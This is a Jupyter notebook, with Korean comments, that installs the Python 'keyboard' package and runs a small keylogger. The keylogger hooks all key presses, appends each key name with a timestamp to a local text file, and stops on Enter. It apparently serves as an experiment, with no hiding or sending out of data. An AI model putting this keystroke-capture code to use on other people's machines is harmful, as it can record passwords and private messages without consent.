{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Defaulting to user installation because normal site-packages is not writeable\n",
      "Collecting keyboard\n",
      "  Downloading keyboard-0.13.5-py3-none-any.whl (58 kB)\n",
      "                                              0.0/58.1 kB ? eta -:--:--\n",
      "     -------                                  10.2/58.1 kB ? eta -:--:--\n",
      "     --------------------                   30.7/58.1 kB 435.7 kB/s eta 0:00:01\n",
      "     -------------------------------------- 58.1/58.1 kB 514.6 kB/s eta 0:00:00\n",
      "Installing collected packages: keyboard\n",
      "Successfully installed keyboard-0.13.5\n"
     ]
    }
   ],
   "source": [
    "! pip install keyboard"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "백그라운드에서 키보드 입력을 추적 시작... 로그는 '키보드_로그.txt' 파일에 저장됩니다.\n",
      "프로그램을 종료하려면 'Enter' 키를 누르세요.\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[3], line 16\u001b[0m\n\u001b[0;32m     14\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m백그라운드에서 키보드 입력을 추적 시작... 로그는 \u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;132;01m{\u001b[39;00mlog_파일_이름\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m 파일에 저장됩니다.\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[0;32m     15\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m프로그램을 종료하려면 \u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124mEnter\u001b[39m\u001b[38;5;124m'\u001b[39m\u001b[38;5;124m 키를 누르세요.\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n\u001b[1;32m---> 16\u001b[0m keyboard\u001b[38;5;241m.\u001b[39mwait(\u001b[38;5;124m'\u001b[39m\u001b[38;5;124menter\u001b[39m\u001b[38;5;124m'\u001b[39m) \u001b[38;5;66;03m# Enter 키를 누를 때까지 대기\u001b[39;00m\n\u001b[0;32m     17\u001b[0m \u001b[38;5;28mprint\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124m키보드 추적 프로그램 종료 및 로그 저장 완료.\u001b[39m\u001b[38;5;124m\"\u001b[39m)\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\keyboard\\__init__.py:882\u001b[0m, in \u001b[0;36mwait\u001b[1;34m(hotkey, suppress, trigger_on_release)\u001b[0m\n\u001b[0;32m    880\u001b[0m     lock \u001b[38;5;241m=\u001b[39m _Event()\n\u001b[0;32m    881\u001b[0m     remove \u001b[38;5;241m=\u001b[39m add_hotkey(hotkey, \u001b[38;5;28;01mlambda\u001b[39;00m: lock\u001b[38;5;241m.\u001b[39mset(), suppress\u001b[38;5;241m=\u001b[39msuppress, trigger_on_release\u001b[38;5;241m=\u001b[39mtrigger_on_release)\n\u001b[1;32m--> 882\u001b[0m     lock\u001b[38;5;241m.\u001b[39mwait()\n\u001b[0;32m    883\u001b[0m     remove_hotkey(remove)\n\u001b[0;32m    884\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n",
      "File \u001b[1;32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\keyboard\\__init__.py:117\u001b[0m, in \u001b[0;36m_Event.wait\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m    115\u001b[0m \u001b[38;5;28;01mdef\u001b[39;00m \u001b[38;5;21mwait\u001b[39m(\u001b[38;5;28mself\u001b[39m):\n\u001b[0;32m    116\u001b[0m     \u001b[38;5;28;01mwhile\u001b[39;00m \u001b[38;5;28;01mTrue\u001b[39;00m:\n\u001b[1;32m--> 117\u001b[0m         \u001b[38;5;28;01mif\u001b[39;00m _UninterruptibleEvent\u001b[38;5;241m.\u001b[39mwait(\u001b[38;5;28mself\u001b[39m, \u001b[38;5;241m0.5\u001b[39m):\n\u001b[0;32m    118\u001b[0m             \u001b[38;5;28;01mbreak\u001b[39;00m\n",
      "File \u001b[1;32mc:\\ProgramData\\Anaconda3\\envs\\torchenv\\Lib\\threading.py:622\u001b[0m, in \u001b[0;36mEvent.wait\u001b[1;34m(self, timeout)\u001b[0m\n\u001b[0;32m    620\u001b[0m signaled \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_flag\n\u001b[0;32m    621\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m \u001b[38;5;129;01mnot\u001b[39;00m signaled:\n\u001b[1;32m--> 622\u001b[0m     signaled \u001b[38;5;241m=\u001b[39m \u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39m_cond\u001b[38;5;241m.\u001b[39mwait(timeout)\n\u001b[0;32m    623\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m signaled\n",
      "File \u001b[1;32mc:\\ProgramData\\Anaconda3\\envs\\torchenv\\Lib\\threading.py:324\u001b[0m, in \u001b[0;36mCondition.wait\u001b[1;34m(self, timeout)\u001b[0m\n\u001b[0;32m    322\u001b[0m \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[0;32m    323\u001b[0m     \u001b[38;5;28;01mif\u001b[39;00m timeout \u001b[38;5;241m>\u001b[39m \u001b[38;5;241m0\u001b[39m:\n\u001b[1;32m--> 324\u001b[0m         gotit \u001b[38;5;241m=\u001b[39m waiter\u001b[38;5;241m.\u001b[39macquire(\u001b[38;5;28;01mTrue\u001b[39;00m, timeout)\n\u001b[0;32m    325\u001b[0m     \u001b[38;5;28;01melse\u001b[39;00m:\n\u001b[0;32m    326\u001b[0m         gotit \u001b[38;5;241m=\u001b[39m waiter\u001b[38;5;241m.\u001b[39macquire(\u001b[38;5;28;01mFalse\u001b[39;00m)\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "import keyboard\n",
    "import time\n",
    "\n",
    "log_파일_이름 = \"키보드_로그.txt\"\n",
    "\n",
    "def 키_이벤트_처리(event):\n",
    "    if event.event_type == keyboard.KEY_DOWN:  # 키를 눌렀을 때만 기록\n",
    "        timestamp = time.strftime(\"%Y-%m-%d %H:%M:%S\")\n",
    "        로그_내용 = f\"[{timestamp}] 눌림: {event.name}\\n\"\n",
    "        with open(log_파일_이름, \"a\", encoding=\"utf-8\") as 파일:\n",
    "            파일.write(로그_내용)\n",
    "\n",
    "keyboard.hook(키_이벤트_처리)\n",
    "print(f\"백그라운드에서 키보드 입력을 추적 시작... 로그는 '{log_파일_이름}' 파일에 저장됩니다.\")\n",
    "print(\"프로그램을 종료하려면 'Enter' 키를 누르세요.\")\n",
    "keyboard.wait('enter') # Enter 키를 누를 때까지 대기\n",
    "print(\"키보드 추적 프로그램 종료 및 로그 저장 완료.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "torchenv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
